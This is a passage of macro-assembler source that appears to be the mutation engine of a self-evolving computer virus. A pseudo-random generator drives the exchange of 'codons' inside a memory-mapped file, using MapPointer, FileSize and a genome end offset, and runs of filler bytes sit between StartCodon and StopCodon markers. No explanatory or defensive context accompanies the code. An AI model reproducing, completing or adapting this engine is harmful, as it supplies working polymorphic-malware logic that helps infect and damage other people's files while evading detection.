        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 223
db 77
db 70
db 11
db 191
db 90
db 193
db 93
db 244
db 166
db 72
db 9
db 56
db 224
db 167
db 19
db 178
db 255
db 232
db 42
db 146
db 35
db 130
db 224
db 217
db 155
db 142
db 25
db 255
db 98
db 203
db 151
db 232
db 12
db 237
db 15
db 51
db 178
db 187
db 143
db 248
db 71
db 29
db 145
db 55
db 32
db 100
db 136
db 139
db 64
db 111
db 192
db 4
db 227
db 16
db 4
db 207
db 12
db 185
db 124
db 250
db 59
db 158
db 234
db 174
db 32
db 246
db 193
db 6
db 191
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
db StopCodon
db 121
db 115
db 73
db 135
db 142
db 33
db 62
db 120
db 177
db 93
db 32
db 210
db 132
db 44
db 79
db 39
db 253
db 38
db 105
db 21
db 146
db 16
db 102
db 76
db 240
db 7
db 190
db 62
db 51
db 41
db 16
db 86
db 234
db 233
db 91
db 72
db 181
db 189
db 7
db 138
db 133
db 118
db 119
db 44
db 136
db 166
db 56
db 61
db 81
db 106
db 110
db 78
db 15
db 42
db 155
db 177
db 1
db 241
db 163
db 145
db 162
db 25
db 200
db 36
db 205
db 39
db 191
db 64
db 136
db 248
db 151
db 238
db 71
db 203
db 3
db 155
db StartCodon
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _saveWrtOff
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=7
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 187
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 12
db 218
db 67
db 21
db 183
db 151
db 118
db 12
db 241
db 249
db 83
db 198
db 159
db 138
db 189
db 77
db 6
db 133
db 85
db 71
db 118
db 241
db 87
db 5
db 169
db 29
db 244
db 6
db 207
db 201
db 14
db 230
db 175
db 10
db 77
db 228
db 62
db 30
db 133
db 110
db 22
db 204
db 23
db 199
db 250
db 96
db 45
db 133
db 8
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _save
    _getDO
_nopREAL
_nopREAL
_nopREAL
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
db StopCodon
db 13
db 128
db 3
db 142
db 112
db 79
db 97
db 88
db StartCodon
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 186
db 249
db 173
db 100
db 3
db 172
db 233
db 200
db 65
db 236
db 188
db 28
db 17
db 255
db 137
db 92
db 178
db 20
db 147
db 166
db 211
db 201
db 246
db 93
db 47
db 7
db 157
db 240
db 140
db 119
db StartCodon
        _getdata
db StopCodon
db 80
db 82
db 202
db 3
db 64
db 182
db 247
db 125
db 82
db 9
db 182
db 155
db 205
db 200
db 85
db 131
db 38
db 37
db 184
db 221
db 84
db 115
db 17
db 168
db 64
db 184
db 46
db 246
db 57
db 24
db 230
db 238
db 91
db 255
db 110
db 215
db 240
db 113
db 32
db 107
db 131
db 140
db 72
db 121
db 66
db 213
db 254
db 207
db 204
db 117
db 18
db 220
db 82
db 147
db 91
db 126
db 44
db 243
db 46
db 135
db 146
db StartCodon
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdA
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
db StopCodon
db 114
db 81
db 232
db 242
db 207
db 77
db 6
db 141
db 23
db 122
db 220
db 4
db 148
db 43
db 248
db StartCodon
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
db StopCodon
db 9
db 36
db 144
db 165
db 247
db 77
db 225
db 127
db 117
db 54
db 239
db 245
db StartCodon
       _nopdD
    BigNum=xchgThreshold1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 89
db 224
db 90
db 126
db 202
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _div
       _nopsD
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _sub0001        ; BC1=0xFFFFFFFF
        _xor            ; BC1=0xFFFFFFFF XOR BC2
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+(-BC2)
       _JnzDown                 ; if not zero, dont exchange codons
           _nopsB                   ; restore
           _writeDWord              ; save mutation!
           _nopREAL
           _nopREAL
    _getDO
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 39
db 74
db 58
db 26
db 182
db 167
db 225
db 248
db 189
db 236
db 245
db 189
db 164
db 37
db 15
db 153
db 151
db 212
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _saveWrtOff
        _getdata
        _nopdA                   ; eax=[RandomNumber]
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
    BigNum=1103515245
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 120
db 53
db 184
db 116
db 246
db 205
db StartCodon
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _mul                     ; eax*=1103515245 % 2^32
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
    BigNum=12345
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
db StopCodon
db 227
db 241
db 39
db 131
db 98
db 244
db 78
db 38
db 223
db 127
db 195
db 27
db 20
db 149
db 139
db 40
db 16
db 238
db StartCodon
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 39
db 175
db 165
db 30
db 148
db 123
db 126
db 11
db 225
db 2
db 225
db 183
db 144
db 215
db 160
db 232
db 117
db 218
db 27
db 210
db 198
db 238
db 192
db 115
db 165
db 22
db 44
db 189
db 95
db 132
db 102
db 48
db 191
db 113
db 212
db 208
db 109
db 58
db 188
db 131
db 46
db 228
db 62
db 134
db 163
db 89
db 41
db 47
db 239
db 194
db 241
db 168
db 221
db 44
db 173
db 184
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
        _save
        _nopsA
        _addsaved                ; eax+=12345 % 2^32
        _writeDWord              ; mov [RandomNumber], ebx
       _pop
    BigNum=1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
db StopCodon
db 227
db 81
db 53
db 133
db 171
db 139
db 109
db 22
db 40
db 203
db 85
db 4
db 224
db 69
db 80
db 64
db 235
db 98
db 114
db 62
db 251
db 71
db 11
db 108
db 217
db 60
db 75
db 249
db 9
db 4
db 33
db 86
db 58
db 186
db 19
db 242
db 220
db 194
db 245
db 56
db 199
db 67
db 230
db 157
db 8
db 73
db 199
db 188
db 62
db 28
db 55
db 82
db 137
db 196
db 234
db 165
db 223
db StartCodon
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 98
db 72
db 87
db 15
db 95
db 51
db 131
db 43
db 244
db 143
db 38
db 218
db 218
db 42
db 149
db 163
db 128
db 205
db 134
db 75
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _nopdB                   ; inc counter
    _getDO
    BigNum=MapPointer-DataOffset
    AlreadyStarted=0
    if BigNum<25
db StopCodon
db 144
db 6
db 118
db 62
db 50
db 248
db 175
db 4
db 86
db 206
db StartCodon
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
db StopCodon
db 248
db 91
db 6
db 162
db 27
db 172
db 168
db 148
db 187
db 185
db 209
db 96
db 107
db 224
db 196
db 38
db 126
db 184
db 192
db 115
db 147
db 70
db 157
db 231
db 65
db 164
db 81
db 28
db 24
db 211
db 242
db 9
db 18
db 118
db 182
db 90
db 159
db 229
db 110
db 4
db 129
db 125
db 202
db 123
db 226
db 163
db 114
db 71
db 116
db 168
db 237
db 10
db 128
db 31
db 21
db 69
db 248
db 119
db 239
db 143
db 187
db 86
db 248
db 8
db 246
db 28
db 28
db 16
db 134
db 12
db 210
db 143
db 116
db 220
db 83
db 99
db 110
db 178
db StartCodon
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_nopREAL
_nopREAL
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _save
db StopCodon
db 118
db 195
db 95
db 181
db 19
db 50
db 154
db 101
db 242
db 54
db 118
db 41
db 0
db 182
db 140
db 98
db 139
db 55
db 8
db 37
db 201
db 107
db 196
db 238
db 221
db 67
db 29
db 176
db 222
db 220
db 85
db 61
db 104
db 215
db 221
db 77
db 233
db 133
db 85
db 125
db 92
db 109
db 11
db 254
db 252
db 122
db 243
db 124
db 252
db 34
db 41
db 124
db StartCodon
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
        _pushall                ; save all registers
        _push                   ; save BC1
db StopCodon
db 72
db 20
db 141
db 157
db 203
db StartCodon
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 129
db 242
db 116
db 223
db 250
db 20
db 194
db 136
db 249
db 118
db 155
db 132
db 204
db 252
db 85
db 168
db 141
db 179
db 94
db 183
db 235
db 102
db 84
db 222
db 37
db 197
db 232
db StartCodon
        _getdata
db StopCodon
db 226
db 157
db StartCodon
    _getDO
    BigNum=FileSize-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 133
db 188
db 155
db 194
db 33
db 177
db 223
db 70
db 10
db 17
db 136
db 87
db 154
db 61
db 117
db 58
db 238
db 197
db 213
db 116
db 198
db 23
db 250
db 14
db 150
db 156
db 230
db 31
db 8
db 82
db 68
db 44
db 241
db 18
db 197
db 180
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _sub0001
       _sub0001
       _sub0001
db StopCodon
db 100
db 124
db 224
db 133
db 9
db 113
db 175
db 205
db 136
db 149
db 11
db 126
db 120
db 228
db 218
db 176
db 226
db 198
db 135
db 141
db 37
db 218
db 139
db 7
db 247
db 216
db 43
db 59
db 104
db 82
db 8
db 21
db 186
db 191
db 63
db 172
db 224
db 61
db 130
db 69
db 33
db 226
db 103
db 226
db 98
db 200
db 108
db 31
db 164
db 144
db 65
db 52
db 164
db 63
db 47
db 228
db 102
db 239
db 122
db 106
db 154
db 78
db 216
db 0
db 131
db 44
db 92
db 65
db 136
db StartCodon
       _sub0001
       _sub0001
       _sub0001
       _sub0001
       _sub0001
       _sub0001     ; Dont mutate the last 9 bytes because of xchg problems
       _addsaved
       _save                    ; mov save, [MapPointer]+GenomEndInMap
       _nopsB
        _push           ; save BC1
_pushall
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
_nopREAL
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
db StopCodon
db 107
db 244
db 123
db 4
db 61
db 19
db 208
db 244
db 9
db 108
db 224
db 78
db 125
db 163
db 254
db 207
db 222
db 228
db 126
db 169
db 183
db 219
db 240
db 248
db 101
db 8
db 76
db 166
db 33
db 10
db 55
db 75
db 101
db 13
db 196
db 71
db 130
db 6
db 10
db 159
db 71
db 45
db 145
db 33
db 62
db 198
db 80
db 208
db 224
db 212
db 35
db 186
db 104
db 44
db 196
db 85
db 85
db 69
db 187
db 148
db 181
db 70
db 131
db 176
db 24
db 154
db 177
db 230
db 177
db 240
db 156
db 54
db 93
db 202
db 198
db 102
db 175
db 2
db 34
db 234
db 213
db 249
db 107
db 158
db 59
db 241
db 108
db 181
db 174
db 59
db 56
db 243
db 134
db 240
db 242
db 41
db 103
db 123
db 1
db 64
db StartCodon
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
_popall
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _sub0001        ; BC1=0xFFFFFFFF
        _xor            ; BC1=0xFFFFFFFF XOR BC2
        _add0001        ; BC1=-BC2
        _save           ; BC2=-BC2
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+(-BC2)
       _JnzUp                   ; jnz esi
; loop ANextByteInChain
; ##### Finished codons exchange
; ############################################################################
    _getDO
db StopCodon
db 14
db 100
db 49
db 213
db 89
db 6
db 157
db 22
db 163
db 205
db 87
db 59
db 54
db 84
db 98
db 146
db 79
db 111
db 219
db 168
db 217
db 150
db 210
db 21
db 218
db 220
db 245
db 235
db 58
db 53
db 36
db 158
db 107
db 72
db 43
db 254
db 128
db 113
db 10
db 151
db 111
db 198
db 117
db 250
db 247
db 71
db 105
db 120
db 196
db 90
db 214
db 129
db 105
db 231
db 193
db StartCodon
    BigNum=RandomNumber-DataOffset
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
db StopCodon
db 65
db StartCodon
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
        _writeDWord             ; mov dword[RegC], BC1
        _popall                 ; restore all registers
        _popall         ; Restore all registers
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _getdata
        _pushall        ; Restore ZF
        _save
        _and
        _popall
    end if
       _getdata
       _nopdA
_save           ; BC2=BC1
_xor            ; BC1=BC1 XOR BC2 = 0
       _nopdD
    BigNum=InsertThreshold1
    AlreadyStarted=0
    if BigNum<25
        repeat BigNum
            _add0001
        end repeat
    else
        _pushall
        _push  ; BC1 to stack
        _save
        _xor   ; BC1=0
        _add0001
        _save
        _sub0001 ; BC1=0, BC2=1
        irp num, 0x80000000,0x40000000,0x20000000,0x10000000,0x8000000,0x4000000,0x2000000,0x1000000,0x800000,0x400000,0x200000,0x100000,0x80000,0x40000,0x20000,0x10000,0x8000,0x4000,0x2000,0x1000,0x800,0x400,0x200,0x100,0x80,0x40,0x20,0x10,0x8,0x4,0x2,0x1
        {
            if AlreadyStarted=1
                _shl
            end if
            if (BigNum AND num)>0
                _add0001
                AlreadyStarted=1
            end if
        }
        _save           ; BC2=BigNum
        _pop            ; restore BC1
        _addsaved       ; BC1=BC1+BigNum
db StopCodon
db 191
db 188
db 90
db 140
db 247
db 208
db 172
db 3
db 241
db 12
db 164
db 211
db 96
db 64
db 202
db 116
db 45
db 239
db 203
db 249
db 124
db 195
db 248
db 42
db 49
db 176
db 121
db 65
db 240
db 139
db 88
db 41
db 73
db 114
db 212
db 0
db 187
db 67
db 77
db 223
db 143
db 204
db 107
db 202
db 30
db 186
db 224
db 196
db 44
db 166
db 184
db 228
db 86
db 211
db 250
db 215
db 185
db 34
db 97
db 166
db 116
db 181
db 134
db 243
db 26
db 99
db 117
db 69
db 96
db 111
db 229
db 87
db 184
db 213
db StartCodon
        _pushall                ; save all registers
        _push                   ; save BC1
        _getDO                  ; For code-optimization, RegC is at DataOffset+0x0. But could be anywhere as _add0001 exists.
        _saveWrtOff             ; BA1=RegC
        _pop
db StopCodon
db 214
db 216
db 33
db 30
db 16
db 239
db 16
db 194
db 227
db 160
db 59
db 37
db 106
db 191
db 226
db 179
db 138
db 171
db 199
db 100
db 176
db 192
db 132
db 50
db 155
db 248
db 98
db 230
db 181
db 157
db 47
db 174
db 1
db 138
db 114
db 10
db 37
db 240
db 207
db 193
db 63
db 111
db 160
db 81
db 106
db 51
db 233
db 96
db 36
db 91
db 44
db 49
db 226
db 130
db 1
db 31
db 215
db 250
db 188
db 69
db 219
db 214
db 44
db 42
db 105
db 176
db 106
db 249
db 180
db 248
db 185
db 139
db 230
db 25
db 121
db 174
db 47
db 132
db 245
db 198
db 211
db 184
db 175
db 10
db 161
db 177
db 28
db 11
db 77
db 168
db 247
db 149
db 31
db 88
db 199
db 41
db 109
db 29
db 245
db 202
db 63
db 67
db 175
db 199
db 22
db 80
db 176
db 75
db 28
